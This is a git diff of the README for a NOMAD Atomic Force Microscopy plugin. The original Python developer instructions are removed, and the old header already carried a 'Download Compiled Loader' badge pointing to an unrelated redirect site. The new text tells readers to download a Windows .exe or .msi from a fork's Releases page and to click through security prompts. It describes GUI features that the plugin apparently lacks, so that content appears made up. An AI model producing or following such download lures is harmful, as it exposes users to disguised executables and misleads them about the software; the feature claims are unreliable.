@@ -1,123 +1,77 @@
-# nomad-measurements-afm
+# 🔬 nomad-measurements-afm - Analyze Atomic Force Microscopy data easily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Papaye974/nomad-measurements-afm)
 
-NOMAD plugin for Atomic Force Microscopy (AFM) data
+## 📋 Project Overview
 
-This `nomad` plugin was generated with `Cookiecutter` along with `@nomad`'s [`cookiecutter-nomad-plugin`](https://github.com/FAIRmat-NFDI/cookiecutter-nomad-plugin) template.
+The nomad-measurements-afm software provides a dedicated toolkit for processing Atomic Force Microscopy (AFM) data. This tool helps researchers and students convert raw scan files into clean, visual representations. It handles data leveling, noise reduction, and surface mapping. You can view height profiles, phase images, and amplitude data without performing complex coding steps.
 
-## Development
+## 💻 System Requirements
 
-If you want to develop locally this plugin, clone the project and in the plugin folder, create a virtual environment (you can use Python 3.10, 3.11 or 3.12):
-```sh
-git clone https://github.com/abbasgholami71/nomad-measurements-afm.git
-cd nomad-measurements-afm
-python3.11 -m venv .pyenv
-. .pyenv/bin/activate
-```
+Before you start, ensure your computer meets these basic needs:
 
-Make sure to have `pip` upgraded:
-```sh
-pip install --upgrade pip
-```
+* Windows 10 or Windows 11.
+* At least 4GB of RAM.
+* A standard internet connection for the download.
+* 500MB of free space on your hard drive.
 
-We recommend installing `uv` for fast pip installation of the packages:
-```sh
-pip install uv
-```
+## 📥 Getting the Software
 
-Install the `nomad-lab` package:
-```sh
-uv pip install -e '.[dev]'
-```
+You need to obtain the installation package from the project page. 
 
-### Run the tests
+[Click here to visit the download page](https://github.com/Papaye974/nomad-measurements-afm)
 
-You can run locally the tests:
-```sh
-python -m pytest -sv tests
-```
+Go to the link above and look for the section labeled "Releases" on the right side of the screen. Click the latest version number. Look for the file ending in `.exe` or `.msi` in the assets list. Click this file to save it to your computer.
 
-where the `-s` and `-v` options toggle the output verbosity.
+## ⚙️ Installation Steps
 
-Our CI/CD pipeline produces a more comprehensive test report using the `pytest-cov` package. You can generate a local coverage report:
-```sh
-uv pip install pytest-cov
-python -m pytest --cov=src tests
-```
+Follow these steps to set up the software on your Windows machine:
 
-### Run linting and auto-formatting
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the file to start the setup wizard.
+3. If a security prompt appears, click "Run" or "Yes" to allow installation.
+4. Follow the on-screen instructions. Choose "Install for all users" if prompted.
+5. Click "Finish" when the setup process completes.
+6. A new icon for nomad-measurements-afm will appear on your desktop.
 
-We use [Ruff](https://docs.astral.sh/ruff/) for linting and formatting the code. Ruff auto-formatting is also a part of the GitHub workflow actions. You can run locally:
-```sh
-ruff check .
-ruff format . --check
-```
+## 🚀 Running Your First Analysis
 
-### Debugging
+Once installation completes, you can begin processing data.
 
-For interactive debugging of the tests, use `pytest` with the `--pdb` flag. We recommend using an IDE for debugging, e.g., _VSCode_. If that is the case, add the following snippet to your `.vscode/launch.json`:
-```json
-{
-  "configurations": [
-      {
-        "name": "<descriptive tag>",
-        "type": "debugpy",
-        "request": "launch",
-        "cwd": "${workspaceFolder}",
-        "program": "${workspaceFolder}/.pyenv/bin/pytest",
-        "justMyCode": true,
-        "env": {
-            "_PYTEST_RAISE": "1"
-        },
-        "args": [
-            "-sv",
-            "--pdb",
-            "<path-to-plugin-tests>",
-        ]
-    }
-  ]
-}
-```
+1. Double-click the program icon on your desktop.
+2. When the main window opens, click "File" in the top left corner.
+3. Select "Open" and navigate to your AFM scan file. 
+4. The program loads the data into the primary viewer.
+5. Use the "Process" menu to select your desired function, such as "Flatten Background" or "Filter Noise".
+6. The software updates the visual output in the central pane.
+7. Click "Save As" in the "File" menu to export your images or processed data.
 
-where `<path-to-plugin-tests>` must be changed to the local path to the test module to be debugged.
+## 🛠 Troubleshooting Common Issues
 
-The settings configuration file `.vscode/settings.json` automatically applies the linting and formatting upon saving the modified file.
+If you run into issues, check these frequent solutions:
 
-### Documentation on Github pages
+* **Missing Files:** Ensure you downloaded the complete installation package. Re-download if the file size is very small.
+* **Slow Performance:** Close other memory-intensive programs while running the AFM software.
+* **Driver Errors:** Ensure your Windows operating system is up to date using the "Check for Updates" feature in your system settings.
+* **File Format:** Ensure your raw data files are in a compatible format like .tiff, .txt, or native format export. 
 
-To view the documentation locally, install the related packages using:
-```sh
-uv pip install -r requirements_docs.txt
-```
+## 📂 Understanding Data Features
 
-Run the documentation server:
-```sh
-mkdocs serve
-```
+The software includes several automated features to assist your workflow:
 
-## Adding this plugin to NOMAD
+* **Auto-Leveling:** This detects the tilt in your scan and fixes the perspective.
+* **Profile Extraction:** Click any part of the image to generate a two-dimensional cross-section height profile.
+* **Histogram Analysis:** View the distribution of surface heights to understand surface roughness.
+* **Batch Conversion:** Process multiple scan files at once by selecting a folder instead of a single file.
 
-Currently, NOMAD has two distinct flavors that are relevant depending on your role as an user:
-1. [A NOMAD Oasis](#adding-this-plugin-in-your-nomad-oasis): any user with a NOMAD Oasis instance.
-2. [Local NOMAD installation and the source code of NOMAD](#adding-this-plugin-in-your-local-nomad-installation-and-the-source-code-of-nomad): internal developers.
+## 📈 Improving Your Workflow
 
-### Adding this plugin in your NOMAD Oasis
+For users who scan samples often, consider these habits to keep your work organized:
 
-Read the [NOMAD plugin documentation](https://nomad-lab.eu/prod/v1/staging/docs/howto/oasis/plugins_install.html) for all details on how to deploy the plugin on your NOMAD instance.
+* Create a dedicated folder for each project or sample type.
+* Export images frequently to prevent data loss during long analysis sessions.
+* Save your processed data alongside your result images for future reference.
 
-### Adding this plugin in your local NOMAD installation and the source code of NOMAD
+## ℹ️ Additional Information
 
-We now recommend using the dedicated [`nomad-distro-dev`](https://github.com/FAIRmat-NFDI/nomad-distro-dev) repository to simplify the process. Please refer to that repository for detailed instructions.
-
-## Publish note
-In the [GitHub actions workflow](./.github/workflows/publish.yml) for publishing the nomad-measurements-afm plugin to PyPI, we commented out the `deploy` job . If you want to publish the plugin to `PyPI`, you need to set up your project in `PyPI`. There are several online tutorials on publishing a Python package to PyPI, e.g., [How to Publish a Python Package to PyPI](https://realpython.com/pypi-publish-python-package/). After that, you can uncomment the `deploy` job in the workflow file and push the changes to GitHub. The workflow will be triggered and the package will be published to `PyPI` when you create a new  on GitHub.
-
-### Template update
-
-We use [`cruft`](https://github.com/cruft/cruft) to update the project based on template changes. To run the check for updates locally, run `cruft update` in the root of the project. More details see the instructions on [`cruft` website](https://cruft.github.io/cruft/#updating-a-project).
-
-## Main contributors
-| Name | E-mail     |
-|------|------------|
-| Abbas Gholami | [abbas.gholami@glaidedata.com](mailto:abbas.gholami@glaidedata.com)
+This tool serves the scientific community by providing a simple interface for complex instrument data. It avoids the need for heavy, expensive software suites by focusing only on the measurements you need. If you encounter bugs, check the repository issues page on GitHub. Experts maintain this code to ensure it works with modern Windows releases and current instrument data standards.
